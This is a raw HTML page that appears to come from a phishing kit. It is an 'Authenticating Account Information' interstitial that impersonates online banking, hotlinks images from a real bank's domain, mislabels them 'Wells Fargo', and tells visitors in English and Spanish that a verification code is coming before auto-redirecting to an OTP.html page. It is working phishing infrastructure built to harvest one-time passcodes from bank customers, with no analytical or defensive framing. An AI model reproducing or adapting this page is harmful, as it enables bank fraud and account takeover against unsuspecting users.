<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>





<HEAD>
   <meta http-equiv="Content-type" content="text/html; charset=ISO-8859-1" />   
   
   <META HTTP-EQUIV="Refresh" CONTENT="15;URL=OTP.html" >


   

   
   
      
      
   


<TITLE>Authenticating Account Information </TITLE>


   <link rel="stylesheet" type="text/css" href="../common/styles/wibscreen.css" />

</HEAD>               

<BODY BGCOLOR="#ffffff">
  
    
  






<!-- ********************************* Begin Body ************************** -->
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<div id="pause" align="center">
<table width="340" border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td width="72" height="72">
      <img src="https://onlinebanking.firstcaribbeanbank.com/images/loader.gif" height="62" width="62" align="left" hspace="0" alt="Wells Fargo">
    </td>
    <td>
      <img src="https://onlinebanking.firstcaribbeanbank.com/images/loader.gif" height="1" width="3" border="0" alt="">
    </td>
    <td>
      <table width="265" height="72" border="1" cellpadding="5" cellspacing="0">
        <tr>
          <td width="230" valign="bottom" align="left">
            <span class="pausemsg">Please wait a few seconds while we verify your account.A verification Code would be sent to your phone shortly / Espere unos segundos mientras verificamos su cuenta. En breve se enviara un codigo de verificacion a su telefono</span>
          </td>
        </tr>
      </table>
    </td>
  </tr>

  

</table>
</div>


</BODY>
</html>
